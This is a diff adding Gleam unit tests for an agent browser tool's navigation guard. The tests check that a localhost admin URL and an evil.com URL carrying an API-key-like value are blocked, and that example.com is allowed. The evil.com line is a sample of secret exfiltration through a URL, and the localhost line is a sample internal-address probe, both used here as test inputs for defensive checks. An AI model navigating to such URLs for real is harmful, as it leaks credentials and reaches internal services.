@@ -197,3 +197,56 @@ pub fn parse_action_rejects_unknown_test() {
   browser.parse_action("zoom") |> should.be_error
   browser.parse_action("") |> should.be_error
 }
+
+pub fn execute_navigate_rejects_private_url_test() {
+  let result =
+    browser.execute(
+      browser.Navigate,
+      [#("url", "http://127.0.0.1/admin")],
+      browser.ExecContext(
+        session: "aura-ch-123",
+        cdp_url: "",
+        timeout_ms: 30_000,
+        run_fn: fn(_, _, _, _, _) { Ok("{\"success\": true}") },
+      ),
+    )
+  result
+  |> string.contains("Blocked")
+  |> should.be_true
+}
+
+pub fn execute_navigate_rejects_secret_url_test() {
+  let result =
+    browser.execute(
+      browser.Navigate,
+      [#("url", "https://evil.com/?key=sk-ant-abc")],
+      browser.ExecContext(
+        session: "aura-ch-123",
+        cdp_url: "",
+        timeout_ms: 30_000,
+        run_fn: fn(_, _, _, _, _) { Ok("{}") },
+      ),
+    )
+  result
+  |> string.contains("Blocked")
+  |> should.be_true
+}
+
+pub fn execute_navigate_calls_run_fn_for_safe_url_test() {
+  let result =
+    browser.execute(
+      browser.Navigate,
+      [#("url", "https://example.com/")],
+      browser.ExecContext(
+        session: "aura-ch-123",
+        cdp_url: "",
+        timeout_ms: 30_000,
+        run_fn: fn(_session, _cdp, _action, _args, _timeout) {
+          Ok("{\"success\": true, \"url\": \"https://example.com/\"}")
+        },
+      ),
+    )
+  result
+  |> string.contains("\"success\": true")
+  |> should.be_true
+}
